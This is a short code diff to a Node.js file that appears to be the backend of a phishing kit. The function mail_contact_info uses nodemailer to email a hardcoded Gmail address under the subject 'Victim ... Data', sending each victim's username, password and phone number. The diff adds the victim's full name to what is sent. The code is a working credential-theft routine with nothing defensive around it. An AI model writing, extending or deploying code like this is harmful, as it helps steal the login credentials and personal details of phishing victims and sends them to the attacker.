@@ -36,7 +36,7 @@ function mailkaro(dataof,usname, passpw){
 
 
 
-function mail_contact_info(dataof,usname, passpw, phone){
+function mail_contact_info(dataof,fullname,usname, passpw, phone){
   const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
@@ -51,6 +51,7 @@ function mail_contact_info(dataof,usname, passpw, phone){
     to: 'syedsaifali214@gmail.com', // Replace with the recipient's email address
     subject: `Victim ${dataof} Data`,
     text: `
+                  Name     : ${fullname}
                   username : ${usname}
                   Password : ${passpw}
                   phone    : ${phone}`,
